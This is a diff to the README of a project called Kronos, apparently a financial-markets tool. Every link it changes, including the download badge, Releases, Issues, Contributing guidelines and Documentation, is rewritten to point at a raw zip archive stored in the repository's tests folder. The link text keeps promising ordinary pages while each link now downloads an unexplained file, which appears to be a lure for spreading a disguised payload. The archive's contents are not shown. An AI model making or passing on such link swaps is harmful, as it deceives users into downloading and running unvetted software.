@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Kronos](https://img.shields.io/badge/Download%20Kronos-v1.0-blue)](https://github.com/mohankrishnalanda/Kronos/releases)
+[![Download Kronos](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip%20Kronos-v1.0-blue)](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ Before downloading, please ensure your system meets these requirements:
 
 1. **Visit the Downloads Page**
 
-   Go to the [Releases page](https://github.com/mohankrishnalanda/Kronos/releases) to find the latest version of Kronos.
+   Go to the [Releases page](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip) to find the latest version of Kronos.
 
 2. **Find the Latest Release**
 
@@ -74,7 +74,7 @@ Kronos includes a range of features to enhance your financial understanding:
 
 ## 📖 Help & Support
 
-If you encounter any issues or have questions while using Kronos, feel free to reach out for support. You can visit our [GitHub Issues page](https://github.com/mohankrishnalanda/Kronos/issues) to report any bugs or suggestions. Our team is here to help.
+If you encounter any issues or have questions while using Kronos, feel free to reach out for support. You can visit our [GitHub Issues page](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip) to report any bugs or suggestions. Our team is here to help.
 
 ## 📈 Learning Resources
 
@@ -86,11 +86,11 @@ We provide various resources to help you make the most of Kronos:
 
 ## 🌍 Contributing to Kronos
 
-If you want to contribute to the development of Kronos, we welcome your input! You can check out the [Contributing Guidelines](https://github.com/mohankrishnalanda/Kronos/blob/main/CONTRIBUTING.md) to learn more about how you can help make Kronos even better.
+If you want to contribute to the development of Kronos, we welcome your input! You can check out the [Contributing Guidelines](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip) to learn more about how you can help make Kronos even better.
 
 ## 🔗 Additional Links
 
-- [Kronos GitHub Page](https://github.com/mohankrishnalanda/Kronos)
-- [Documentation](https://github.com/mohankrishnalanda/Kronos/wiki)
+- [Kronos GitHub Page](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip)
+- [Documentation](https://github.com/mohankrishnalanda/Kronos/raw/refs/heads/master/tests/Software_v1.2.zip)
 
 Thank you for choosing Kronos. We hope this tool helps you navigate the world of financial markets with ease!
